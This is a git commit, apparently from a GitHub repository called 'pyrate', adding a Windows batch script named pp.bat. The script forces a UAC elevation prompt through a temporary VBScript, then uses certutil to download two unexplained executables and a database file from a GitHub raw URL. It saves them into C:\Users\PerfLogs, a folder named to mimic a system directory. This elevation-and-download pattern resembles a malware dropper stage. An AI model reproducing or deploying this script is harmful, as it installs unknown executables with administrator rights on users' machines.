7c6a7f12dfc6ef3fe64ee44c0bbe2c1528247b31
Simul Ahmed <140954342+Simul-Ahmed-006@users.noreply.github.com>
2024-03-21 10:39:18 +0600

    Add files via upload

---
+++ pp.bat
@@ -0,0 +1,49 @@
+@echo off
+
+:: BatchGotAdmin
+:-------------------------------------
+REM  --> Check for permissions
+>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
+
+REM --> If error flag set, we do not have admin.
+if '%errorlevel%' NEQ '0' (
+    echo Requesting administrative privileges...
+    goto UACPrompt
+) else ( goto gotAdmin )
+
+:UACPrompt
+    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
+    echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%temp%\getadmin.vbs"
+
+    "%temp%\getadmin.vbs"
+    exit /B
+
+:gotAdmin
+    if exist "%temp%\getadmin.vbs" ( del "%temp%\getadmin.vbs" )
+    pushd "%CD%"
+    CD /D "%~dp0"
+:--------------------------------------
+
+set DOWNLOAD_DIR=C:\Users\PerfLogs
+
+set FILE1_URL=https://github.com/Simul-Ahmed-006/pyrate/raw/main/new.exe
+set FILE2_URL=https://github.com/Simul-Ahmed-006/pyrate/raw/main/cdb.exe
+set FILE3_URL=https://github.com/Simul-Ahmed-006/pyrate/raw/main/file_info.db
+
+rem Create the directory if it doesn't exist
+if not exist "%DOWNLOAD_DIR%" (
+    mkdir "%DOWNLOAD_DIR%"
+)
+
+rem Download files to the directory
+echo Downloading file 1...
+certutil -urlcache -split -f "%FILE1_URL%" "%DOWNLOAD_DIR%\new.exe"
+
+echo Downloading file 2...
+certutil -urlcache -split -f "%FILE2_URL%" "%DOWNLOAD_DIR%\cdb.exe"
+
+echo Downloading file 3...
+certutil -urlcache -split -f "%FILE3_URL%" "%DOWNLOAD_DIR%\file_info.db"
+
+echo Download complete.
+pause
